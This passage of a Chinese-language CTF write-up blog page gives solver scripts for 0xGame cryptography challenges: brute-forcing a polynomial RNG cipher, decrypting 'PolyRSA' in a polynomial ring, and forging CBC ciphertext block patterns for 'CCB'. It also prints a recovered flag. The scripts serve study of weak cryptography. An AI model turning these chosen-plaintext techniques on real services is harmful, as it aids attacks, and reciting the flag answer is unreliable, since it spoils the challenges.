class=\"number\">3882966344</span>, <span class=\"number\">1327689887</span>, <span class=\"number\">3674970320</span>, <span class=\"number\">2187841171</span>, <span class=\"number\">2311252450</span>, <span class=\"number\">482971802</span>, <span class=\"number\">1729193547</span>, <span class=\"number\">358579918</span>, <span class=\"number\">927519716</span>, <span class=\"number\">1913893602</span>, <span class=\"number\">1846075319</span>, <span class=\"number\">1560219121</span>, <span class=\"number\">3400251736</span>, <span class=\"number\">2548802464</span>, <span class=\"number\">684657754</span>, <span class=\"number\">989524061</span>, <span class=\"number\">324600525</span>, <span class=\"number\">197683993</span>, <span class=\"number\">1609214168</span>, <span class=\"number\">3772472918</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">RNG</span>():</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, coefficients, seed, MOD=<span class=\"number\">2</span>**<span class=\"number\">20</span></span>):</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.coefficients = coefficients</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.state = seed</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.MOD = MOD</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.f = <span class=\"keyword\">lambda</span> x: <span class=\"built_in\">sum</span>(c * (x ** i) <span class=\"keyword\">for</span> i, c <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(coefficients)) % MOD</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">next</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.state = <span class=\"variable language_\">self</span>.f(<span class=\"variable language_\">self</span>.state)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">self</span>.state</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 生成 RNG 状态序列（足够长，比如 5000 个状态，确保覆盖循环）</span></span><br><span class=\"line\">seed = <span class=\"number\">1</span></span><br><span class=\"line\">rng = RNG(coefficients, seed)</span><br><span class=\"line\">states = [seed]</span><br><span class=\"line\"><span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5000</span>):</span><br><span class=\"line\">    nxt = rng.<span class=\"built_in\">next</span>()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> nxt == states[<span class=\"number\">0</span>]:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    states.append(nxt)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Generated <span class=\"subst\">&#123;<span class=\"built_in\">len</span>(states)&#125;</span> unique RNG states&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 枚举 a 和 b 的可能值（索引从 1 到 1024）</span></span><br><span class=\"line\">found = <span class=\"literal\">False</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"built_in\">min</span>(<span class=\"number\">1025</span>, <span class=\"built_in\">len</span>(states))):</span><br><span class=\"line\">    a = states[i]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> gcd(a, MOD) != <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    inv_a = inverse(a, MOD)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"built_in\">min</span>(<span class=\"number\">1025</span>, <span class=\"built_in\">len</span>(states))):</span><br><span class=\"line\">        b = states[j]</span><br><span class=\"line\">        plain = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> enc_flag:</span><br><span class=\"line\">            possible_byte = <span class=\"literal\">None</span></span><br><span class=\"line\">            state_val = c</span><br><span class=\"line\">            <span class=\"comment\"># 反向 1 到 1024 步</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> step <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">1025</span>):</span><br><span class=\"line\">                state_val = (state_val - b) * inv_a % MOD</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"number\">0</span> &lt;= state_val &lt;= <span class=\"number\">255</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> possible_byte <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                        possible_byte = state_val</span><br><span class=\"line\">                    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                        <span class=\"comment\"># 如果多个步数都得到合法字节，需要选择，这里先取第一个</span></span><br><span class=\"line\">                        <span class=\"comment\"># 实际上应该检查一致性，我们先简单处理</span></span><br><span class=\"line\">                        <span class=\"keyword\">pass</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> possible_byte <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            plain.append(possible_byte)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(plain) == <span class=\"built_in\">len</span>(enc_flag):</span><br><span class=\"line\">            <span class=\"comment\"># 检查是否可打印 ASCII</span></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                text = <span class=\"built_in\">bytes</span>(plain).decode(<span class=\"string\">&#x27;ascii&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"built_in\">all</span>(<span class=\"number\">32</span> &lt;= p &lt; <span class=\"number\">127</span> <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> plain):</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Found: a=<span class=\"subst\">&#123;a&#125;</span>, b=<span class=\"subst\">&#123;b&#125;</span>, plaintext = <span class=\"subst\">&#123;text&#125;</span>&quot;</span>)</span><br><span class=\"line\">                    found = <span class=\"literal\">True</span></span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> found:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> found:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Not found with given constraints.&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"PolyRSA\"><a href=\"#PolyRSA\" class=\"headerlink\" title=\"PolyRSA\"></a>PolyRSA</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = Integer(<span class=\"number\">211381997162225534712606028333737323293</span>)</span><br><span class=\"line\">q = Integer(<span class=\"number\">291844321073146066895055929747029949743</span>)</span><br><span class=\"line\">n = p * q</span><br><span class=\"line\">e = <span class=\"number\">65537</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义多项式环</span></span><br><span class=\"line\">Rp.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class=\"line\">Rq.&lt;x&gt; = PolynomialRing(GF(q))</span><br><span class=\"line\">Rn.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义模 x^8 - 1</span></span><br><span class=\"line\">Sp = Rp.quotient(x^<span class=\"number\">8</span> - <span class=\"number\">1</span>, <span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">Sq = Rq.quotient(x^<span class=\"number\">8</span> - <span class=\"number\">1</span>, <span class=\"string\">&#x27;b&#x27;</span>)</span><br><span class=\"line\">Sn = Rn.quotient(x^<span class=\"number\">8</span> - <span class=\"number\">1</span>, <span class=\"string\">&#x27;c&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 密文多项式系数</span></span><br><span class=\"line\">c_coeffs = [<span class=\"number\">40882135200347703593754473549436673146387957409540306808209934514868940052992</span>,</span><br><span class=\"line\">            <span class=\"number\">13673861744940819052324430973254902841262867940443611208276249322420769352299</span>,</span><br><span class=\"line\">            <span class=\"number\">14825937682750201471490037222143248112539971745568733623844924679519292569979</span>,</span><br><span class=\"line\">            <span class=\"number\">38679688295547579683397975810830690182925250157203662993481664387755200460738</span>,</span><br><span class=\"line\">            <span class=\"number\">48188456496545346035512990878010917911654453288374940837147218298761674630209</span>,</span><br><span class=\"line\">            <span class=\"number\">573073037892837477865699910635548796182825197336726898256762153949994844160</span>,</span><br><span class=\"line\">            <span class=\"number\">33191976337303879621137795936787377133622652419928253776624421127421475322069</span>,</span><br><span class=\"line\">            <span class=\"number\">46680445255028101113817388282005859237776046219558912765486646689142241483104</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">c_poly = Sn(c_coeffs)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 计算单位群阶</span></span><br><span class=\"line\">order_p = (p-<span class=\"number\">1</span>)^<span class=\"number\">2</span> * (p^<span class=\"number\">2</span> - <span class=\"number\">1</span>) * (p^<span class=\"number\">4</span> - <span class=\"number\">1</span>)</span><br><span class=\"line\">order_q = (q-<span class=\"number\">1</span>)^<span class=\"number\">2</span> * (q^<span class=\"number\">2</span> - <span class=\"number\">1</span>) * (q^<span class=\"number\">4</span> - <span class=\"number\">1</span>)</span><br><span class=\"line\">order = lcm(order_p, order_q)</span><br><span class=\"line\">d = inverse_mod(e, order)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 解密</span></span><br><span class=\"line\">m_poly = c_poly^d</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取系数</span></span><br><span class=\"line\">m_coeffs = [Integer(m_poly[i]) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;解密后的系数:&quot;</span>, m_coeffs)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查系数是否在字节范围内</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i, coeff <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(m_coeffs):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;系数 <span class=\"subst\">&#123;i&#125;</span>: <span class=\"subst\">&#123;coeff&#125;</span> (在 0-255 内: <span class=\"subst\">&#123;<span class=\"number\">0</span> &lt;= coeff &lt;= <span class=\"number\">255</span>&#125;</span>)&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 如果在字节范围内，转为字符</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">all</span>(<span class=\"number\">0</span> &lt;= coeff &lt;= <span class=\"number\">255</span> <span class=\"keyword\">for</span> coeff <span class=\"keyword\">in</span> m_coeffs):</span><br><span class=\"line\">    flag = <span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">chr</span>(b) <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> m_coeffs)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Flag:&quot;</span>, flag)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;解密失败：系数不在 ASCII 范围内&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;尝试用 long_to_bytes 方式:&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        flag_bytes = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> coeff <span class=\"keyword\">in</span> m_coeffs:</span><br><span class=\"line\">            <span class=\"comment\"># 将大整数转为字节</span></span><br><span class=\"line\">            <span class=\"keyword\">while</span> coeff &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">                flag_bytes = <span class=\"built_in\">bytes</span>([coeff % <span class=\"number\">256</span>]) + flag_bytes</span><br><span class=\"line\">                coeff //= <span class=\"number\">256</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Flag bytes:&quot;</span>, flag_bytes)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;错误:&quot;</span>, e)</span><br></pre></td></tr></table></figure>\n\n<p>得到<code>0xGame&#123;D0_y0u_l1k3_RSA_w1th_p0lyn0m14l_r1ngs?&#125;</code></p>\n<h2 id=\"CCB\"><a href=\"#CCB\" class=\"headerlink\" title=\"CCB\"></a>CCB</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> b64decode, b64encode</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Given IV</span></span><br><span class=\"line\">IV = b64decode(<span class=\"string\">&quot;Mkoz9OBLUA4EgWqbuheBcg==&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;IV: <span class=\"subst\">&#123;IV.<span class=\"built_in\">hex</span>()&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Step 1: Create C-B-C pattern</span></span><br><span class=\"line\"><span class=\"comment\"># We need C1 = C3 != C2</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># For CBC mode:</span></span><br><span class=\"line\"><span class=\"comment\"># C1 = E(P1 ⊕ IV)</span></span><br><span class=\"line\"><span class=\"comment\"># C2 = E(P2 ⊕ C1)</span></span><br><span class=\"line\"><span class=\"comment\"># C3 = E(P3 ⊕ C2)</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Strategy: </span></span><br><span class=\"line\"><span class=\"comment\"># 1. Choose P1 and P2 arbitrarily</span></span><br><span class=\"line\"><span class=\"comment\"># 2. Encrypt to get C1, C2</span></span><br><span class=\"line\"><span class=\"comment\"># 3. Set P3 = P1 ⊕ IV ⊕ C2 so that P3 ⊕ C2 = P1 ⊕ IV</span></span><br><span class=\"line\"><span class=\"comment\">#    This makes C3 = E(P3 ⊕ C2) = E(P1 ⊕ IV) = C1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n=== Step 1: Creating C-B-C ciphertext ===&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Strategy: Choose P1, P2, then set P3 = P1 ⊕ IV ⊕ C2&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;This will make C3 = C1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># For the first encryption, we can choose any P1 and P2</span></span><br><span class=\"line\"><span class=\"comment\"># But we need to know C1 and C2 to compute P3</span></span><br><span class=\"line\"><span class=\"comment\"># So we&#x27;ll need to do this interactively</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nFirst, encrypt with P1=00...00 (16 zeros), P2=01...01, P3=00...00 (temporary)&quot;</span>)</span><br><span class=\"line\">P1 = <span class=\"string\">b&#x27;\\x00&#x27;</span> * <span class=\"number\">16</span></span><br><span class=\"line\">P2 = <span class=\"string\">b&#x27;\\x01&#x27;</span> * <span class=\"number\">16</span></span><br><span class=\"line\">P3_temp = <span class=\"string\">b&#x27;\\x00&#x27;</span> * <span class=\"number\">16</span></span><br><span class=\"line\">plaintext1_temp = P1 + P2 + P3_temp</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Temporary plaintext (base64): <span class=\"subst\">&#123;b64encode(plaintext1_temp).decode()&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;After getting C1 and C2 from server, calculate:&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;P3 = P1 ⊕ IV ⊕ C2&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Then encrypt again with the corrected plaintext&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n=== Step 2: Creating C-C-B ciphertext ===&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;After getting C and B from step 1:&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;We need C1 = C2 = C and C3 = B&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nStrategy:&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;1. Set P1 such that E(P1 ⊕ IV) = C&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;   So P1 = D(C) ⊕ IV - but we can&#x27;t decrypt without the key&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nAlternative strategy:&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Since C1 from step 1 satisfies C1 = E(P1 ⊕ IV),&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;We need to reuse that same P1&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;For C2 = C1, we need E(P2 ⊕ C1) = C1&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;So P2 ⊕ C1 = P1 ⊕ IV&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Therefore P2 = P1 ⊕ IV ⊕ C1&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nFor C3 = B (which is C2 from step 1):&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;We need E(P3 ⊕ C2) = B&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Since C2 = C1 (both equal to C), P3 ⊕ C1 = P2_old ⊕ C1_old&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;From step 1, C2_old = E(P2_old ⊕ C1_old) = B&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;So we need P3 ⊕ C = P2_old ⊕ C (where C = C1_old)&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Therefore P3 = P2_old&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n=== Practical Solution ===&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;1. Get IV from server&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;2. Encrypt P1||P2||temp with P1=zeros, P2=ones to get C1||C2||C3_temp&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;3. Calculate P3 = P1 ⊕ IV ⊕ C2&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;4. Encrypt P1||P2||P3 to get C||B||C (C-B-C pattern)&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;5. Calculate P2&#x27; = P1 ⊕ IV ⊕ C&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;6. Encrypt P1||P2&#x27;||P2 to get C||C||B (C-C-B pattern)&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;7. Get flag!&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Helper function to XOR bytes</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">xor_bytes</span>(<span class=\"params\">a, b</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">bytes</span>(x ^ y <span class=\"keyword\">for</span> x, y <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(a, b))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n=== Interactive Solver ===&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Step 1: Use option 1 to encrypt this plaintext:&quot;</span>)</span><br><span class=\"line\">P1 = <span class=\"string\">b&#x27;\\x00&#x27;</span> * <span class=\"number\">16</span></span><br><span class=\"line\">P2 = <span class=\"string\">b&#x27;\\xff&#x27;</span> * <span class=\"number\">16</span>  <span class=\"comment\"># Changed to all 0xFF to ensure P2 != P1</span></span><br><span class=\"line\">P3_temp = <span class=\"string\">b&#x27;\\x00&#x27;</span> * <span class=\"number\">16</span></span><br><span class=\"line\">plaintext_temp = P1 + P2 + P3_temp</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;<span class=\"subst\">&#123;b64encode(plaintext_temp).decode()&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nAfter you get the ciphertext, paste it here (base64):&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;(Or type &#x27;manual&#x27; to calculate manually)&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    ct1 = <span class=\"built_in\">input</span>().strip()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ct1.lower() != <span class=\"string\">&#x27;manual&#x27;</span> <span class=\"keyword\">and</span> ct1:</span><br><span class=\"line\">        ct1_bytes = b64decode(ct1)</span><br><span class=\"line\">        C1 = ct1_bytes[:<span class=\"number\">16</span>]</span><br><span class=\"line\">        C2 = ct1_bytes[<span class=\"number\">16</span>:<span class=\"number\">32</span>]</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\nC1: <span class=\"subst\">&#123;C1.<span class=\"built_in\">hex</span>()&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;C2 (this is B): <span class=\"subst\">&#123;C2.<span class=\"built_in\">hex</span>()&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># Calculate correct P3 for C-B-C</span></span><br><span class=\"line\">        P3 = xor_bytes(xor_bytes(P1, IV), C2)</span><br><span class=\"line\">        plaintext_cbc = P1 + P2 + P3</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n=== C-B-C Plaintext (base64) ===&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(b64encode(plaintext_cbc).decode())</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># Calculate P2&#x27; for C-C-B</span></span><br><span class=\"line\">        P2_prime = xor_bytes(xor_bytes(P1, IV), C1)</span><br><span class=\"line\">        plaintext_ccb = P1 + P2_prime + P2</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n=== C-C-B Plaintext (base64) ===&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(b64encode(plaintext_ccb).decode())</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nUse these plaintexts in order when prompted for option 2!&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nManual calculation 